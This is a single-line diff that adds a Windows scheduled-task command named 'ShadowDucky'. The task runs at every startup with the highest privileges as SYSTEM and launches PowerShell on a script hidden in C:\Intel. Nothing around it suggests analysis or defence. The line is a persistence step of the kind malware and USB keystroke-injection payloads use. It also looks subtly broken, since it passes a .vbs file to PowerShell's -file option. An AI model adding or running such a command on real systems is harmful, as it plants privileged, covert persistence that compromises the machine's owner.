@@ -1,0 +1,1 @@
+schtasks /create /tn "ShadowDucky" /sc onstart /delay 0005:00 /rl highest /ru system /tr "powershell.exe -file C:\Intel\ShadowDucky.vbs"
